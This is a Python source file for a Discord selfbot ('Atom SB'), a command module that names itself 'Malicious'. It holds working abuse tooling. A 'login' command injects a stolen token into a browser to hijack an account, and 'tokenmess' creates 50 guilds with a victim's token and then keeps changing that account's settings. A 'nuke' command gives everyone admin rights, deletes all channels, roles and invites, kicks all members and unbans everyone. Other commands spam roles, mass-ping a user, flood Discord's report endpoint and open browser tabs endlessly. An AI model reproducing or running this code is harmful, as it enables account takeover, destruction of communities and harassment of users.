import discord
from discord.ext import commands
import requests
import asyncio
import random
import threading
import time
from itertools import cycle
from utils.helpers import EMBED_COLOUR, VERSION, locales, create_embed
from utils.config import get_token, get_auto_delete_timeout
from colorama import Fore


class Malicious(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        
    @commands.command()
    async def login(self, ctx, _token):
        await ctx.message.delete()
        print(f"{Fore.YELLOW} | Attempting to login to - {Fore.CYAN}{_token}"+Fore.RESET)
        from selenium import webdriver
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("detach", True)
        driver = webdriver.Chrome('AtomSB_Data/Data/chromedriver.exe', options=opts)
        script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
        driver.get("https://discordapp.com/login")
        driver.execute_script(script+f'\nlogin("{_token}")')
        
    @commands.command()
    async def botlogin(self, ctx, _token):
        await ctx.message.delete()
        print(f"{Fore.YELLOW} | Attempting to login to - {Fore.CYAN}{_token}"+Fore.RESET)
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        chrome_options = Options()
        chrome_options.add_extension('AtomSB_Data/Data/extension_1_0_0_0.crx')
        driver = webdriver.Chrome(options=chrome_options, executable_path='AtomSB_Data/Data/chromedriver.exe')
        driver.get('https://discordbotclient.jtmaveryk.repl.co/login')
        import keyboard
        await asyncio.sleep(5)
        keyboard.write(f'{_token}')
        keyboard.press_and_release('enter')
        
    @commands.command()
    async def tokenmess(self, ctx, _token):
        await ctx.message.delete()
        print(f"{Fore.YELLOW} | Raping - {Fore.CYAN}{_token}"+Fore.RESET)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Content-Type': 'application/json',
            'Authorization': _token,
        }
        request = requests.Session()
        payload = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "invisible"
        }
        guild = {
            'channels': None,
            'icon': None,
            'name': "Atom",
            'region': "europe"
        }
        for _i in range(50):
            requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break
        modes = cycle(["light", "dark"])
        statuses = cycle(["online", "idle", "dnd", "invisible"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(locales),
                'status': next(statuses)
            }
            while True:
                try:
                    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
                except Exception as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
                else:
                    break
                    
    @commands.command()
    async def spamr(self, ctx):
        await ctx.message.delete()
        print(f"{Fore.YELLOW} | Attempting to generate roles called - {Fore.CYAN}Atom SB"+Fore.RESET)
        while True:
            guild = ctx.guild
            await guild.create_role(name="Atom SB")
            
    @commands.command()
    async def nuke(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        option = input(f"{Fore.YELLOW} | {Fore.RED}ARE YOU SURE YOU WANT TO NUKE {guild.name}? Type YES if you do and NO if not! : ")
        if option == 'YES':
            guild = ctx.guild
            try:
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions=discord.Permissions.all())
                print(f"{Fore.YELLOW} | {Fore.GREEN}@everyone has been given admin permissions in {guild.name}."+ Fore.RESET)
            except:
                print(f"{Fore.YELLOW} | {Fore.RED}There was an error when attempting to give everyone perms in {guild.name}." + Fore.RESET)
            from colorama import Style
            print(Style.RESET_ALL)
            await asyncio.sleep(2)
            print(f"{Fore.YELLOW} | {Fore.RED}Nuking server {guild.name}...")
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{Fore.YELLOW} | {Fore.GREEN}{channel.name} was successfully deleted." + Fore.RESET)
                except:
                    print(f"{Fore.YELLOW} | {Fore.RED}{channel.name} was not deleted." + Fore.RESET)
            for member in guild.members:
                try:
                    await member.kick()
                    print(f"{Fore.YELLOW} | {Fore.GREEN}{member.name}#{member.discriminator} was kicked." + Fore.RESET)
                except:
                    print(f"{Fore.YELLOW} | {Fore.RED}{member.name}#{member.discriminator} was not kicked." + Fore.RESET)
            for role in guild.roles:
                try:
                    await role.delete()
                    print(f"{Fore.YELLOW} | {Fore.GREEN}{role.name} was successfully deleted." + Fore.RESET)
                except:
                    print(f"{Fore.YELLOW} | {Fore.RED}{role.name} was not deleted." + Fore.RESET)
            for invite in await ctx.guild.invites():
                try:
                    await invite.delete()
                    print(f"{Fore.YELLOW} | {Fore.GREEN}Server invite was deleted." + Fore.RESET)
                except:
                    print(f"{Fore.YELLOW} | {Fore.RED}Server invite was not deleted." + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
                user = ban_entry.user
                try:
                    await guild.unban(user)
                    print(f"{Fore.YELLOW} | {Fore.GREEN}{user.name}#{user.discriminator} was successfully unbanned." + Fore.RESET)
                except:
                    print(f"{Fore.YELLOW} | {Fore.RED}{user.name}#{user.discriminator} was not unbanned." + Fore.RESET)
            print(Style.RESET_ALL)
            print(f"{Fore.YELLOW} | {Fore.GREEN}Nuked {guild.name} successfully")
            return
        else:
            print(f"{Fore.YELLOW} | {Fore.GREEN}Nuke has been aborted!"+Fore.RESET)
            pass
            
    @commands.command()
    async def massping(self, ctx, member: discord.Member):
        await ctx.message.delete()
        print(f"{Fore.YELLOW} | Attempting to ping {Fore.CYAN}{member} {Fore.YELLOW}in every channel"+Fore.RESET)
        text_channel_list = []
        guild = ctx.guild
        try:
            for channel in guild.text_channels:
                text_channel_list.append(channel)
            for channel in text_channel_list:
                await asyncio.sleep(1)
                msg = await channel.send(member.mention)
                await msg.delete()
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{e}"+Fore.RESET)
            
    @commands.command()
    async def ban(self, ctx, member: discord.Member, *, reason='Please write a reason!'):
        await ctx.message.delete()
        try:
            await ctx.guild.ban(member, reason=reason)
            print(f"{Fore.YELLOW} | {member} has been banned "+Fore.RESET)
        except:
            print(f"{Fore.YELLOW} | {member} has not been banned "+Fore.RESET)
            
    @commands.command()
    async def kick(self, ctx, member: discord.Member, *, reason='Please write a reason!'):
        await ctx.message.delete()
        try:
            await ctx.guild.kick(member, reason=reason)
            print(f"{Fore.YELLOW} | {member} has been kicked "+Fore.RESET)
        except:
            print(f"{Fore.YELLOW} | {member} has not been kicked "+Fore.RESET)
            
    @commands.command()
    async def nukechannel(self, ctx):
        await ctx.message.delete()
        channel = ctx.channel
        channel_position = ctx.channel.position
        new_channel = await channel.clone()
        await ctx.channel.delete()
        await new_channel.edit(position=channel_position, sync_permissions=True)
        print(f"{Fore.YELLOW} | Nuked - {Fore.CYAN}{new_channel.name}"+Fore.RESET)
        
    @commands.command()
    async def crash(self, ctx):
        print(f"{Fore.YELLOW} | Crashing you?"+Fore.RESET)
        await ctx.message.delete()
        import webbrowser
        url = 'https://www.google.com/'
        r = requests.get(url)
        while True:
            webbrowser.open(url, new=2)
            
    @commands.command()
    async def cursedv(self, ctx):
        print(f"{Fore.YELLOW} | Sending a video to mess their Discord"+Fore.RESET)
        await ctx.message.delete()
        try:
            with open("AtomSB_Data/Data/Videos/sexy-thighs.mp4", "rb") as file:
                await ctx.send(file=discord.File(file))
        except:
            print("Video file not found")
            
    @commands.command()
    async def cursedv2(self, ctx):
        print(f"{Fore.YELLOW} | Sending a video to mess their Discord"+Fore.RESET)
        await ctx.message.delete()
        try:
            with open("AtomSB_Data/Data/Videos/ComputerVirus.mp4", "rb") as file:
                await ctx.send(file=discord.File(file))
        except:
            print("Video file not found")
            
    @commands.command()
    async def reportuser(self, ctx):
        await ctx.message.delete()
        from colorama import init
        init(convert=True, autoreset=True)
        print(f'{Fore.YELLOW} | Illegal Content        - {Fore.CYAN}1')
        print(f'{Fore.YELLOW} | Harassment             - {Fore.CYAN}2')
        print(f'{Fore.YELLOW} | Spam or Phishing Links - {Fore.CYAN}3')
        print(f'{Fore.YELLOW} | Self Harm              - {Fore.CYAN}4')
        print(f'{Fore.YELLOW} | NSFW Content           - {Fore.CYAN}5')
        option = str(input(f'{Fore.YELLOW} --> :{Fore.CYAN}'))
        if option == '1' or option == 'Illegal Content':
            reason = 0
        elif option == '2' or option == 'Harassment':
            reason = 1
        elif option == '3' or option == 'Spam or Phishing Links':
            reason = 2
        elif option == '4' or option == 'Self Harm':
            reason = 3
        elif option == '5' or option == 'NSFW Content':
            reason = 4
        else:
            return
        token = str(input(f'{Fore.YELLOW} | Token: {Fore.CYAN}'))
        channel = int(input(f'{Fore.YELLOW} | Channel ID: {Fore.CYAN}'))
        message = int(input(f'{Fore.YELLOW} | Message ID: {Fore.CYAN}'))
        guild = int(input(f'{Fore.YELLOW} | Guild ID: {Fore.CYAN}'))
        threads = int(input(f'{Fore.YELLOW} | Threads: {Fore.CYAN}'))
        delay = int(input(f'{Fore.YELLOW} | Delay: {Fore.CYAN}'))
        print('')
        
        Sent = 0
        Errors = 0
        
        def Report(channel, message, guild, reason, token):
            nonlocal Sent, Errors
            try:
                session = requests.Session()
                session.trust_env = False
                headers = {
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US',
                    'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                    'Content-Type': 'application/json',
                    'Authorization': token
                }
                data = '{"channel_id":"%s","message_id":"%s","guild_id":"%s","reason":%s}' % (channel, message, guild, reason)
                Report = session.post('https://discordapp.com/api/v8/report', headers=headers, data=data)
                if Report.status_code == 201:
                    Sent += 1
                elif Report.status_code == 401:
                    Errors += 1
                    print(f'{Fore.YELLOW} | Invalid token: {Fore.CYAN}%s' % (token))
                else:
                    Errors += 1
            except Exception as Error:
                print(Error)
        
        while True:
            if threading.active_count() <= threads:
                try:
                    threading.Thread(target=Report, args=(channel, message, guild, reason, token,)).start()
                except:
                    pass
            time.sleep(delay)


def setup(bot):
    bot.add_cog(Malicious(bot))
